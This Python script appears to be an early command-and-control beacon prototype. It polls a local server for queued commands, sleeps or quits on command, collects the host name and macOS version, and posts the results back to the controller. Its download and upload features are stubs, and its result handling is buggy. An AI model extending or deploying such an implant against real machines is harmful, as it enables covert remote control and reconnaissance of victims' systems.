import requests
import sys
from datetime import datetime
import os
import time

btoken = ""
baseurl = "http://localhost:8080"

def main(argv):
	if len(argv) != 3:
		print("Usage: $ python3 beacon.py <id> <beacon token>")
	else:
		baseurl = "http://localhost:8080"
		url = baseurl + "/beacon/command"

		btoken = argv[2]
		bid = argv[1]

		print(btoken)
		print(bid)

		data = {
			"beacon": {
				"id": bid, 
				"token": btoken,
			},
			"status": "pending",
		}

		headers = {"Content-Type": "application/json; charset=utf-8"}
		response = requests.post(url, headers=headers, json=data)

		print(response.status_code)
		print(response.json())
		
		commands = response.json()
		executed = []

		recv_time = datetime.now()
		recv_time_str = recv_time.strftime("%d/%m/%Y %H:%M:%S")

		for com in commands:
			print(com)

			command_type = com["type"]
			content = com["content"]

			print(command_type)
			print(content)

			result = {}
			result["commandid"] = com["id"]

			if command_type == "SLEEP":
				time.sleep(int(content))
				result["content"] = "sleep success"
			elif command_type == "STOP":
				print("quitting")
				quit()
			elif command_type == "GETHOSTNAME":
				result["content"] = print(os.popen("hostname").read())
			elif command_type == "GETHOSTOSNAME":
				result["content"] = print(os.popen("sw_vers -productVersion").read())
			elif command_type == "DOWNLOAD":
				result["content"] = "pending"
			elif command_type == "UPLOAD":
				result["content"] = "pending"
			
			exec_time = datetime.now()
			exec_time_str = recv_time.strftime("%d/%m/%Y %H:%M:%S")
			result["exec_time"] = exec_time_str
			executed.append(result)

		print(executed)
		
		return_data = {
			"beacon": {
				"id": bid,
				"token": btoken,
			},
			"results": executed,
		}

		return_url = baseurl + "/beacon/result"
		print(return_data)
		headers = {"Content-Type": "application/json; charset=utf-8"}
		response = requests.post(return_url, headers=headers, json=return_data)
		print(response.status_code)

if __name__ == "__main__":
    main(sys.argv)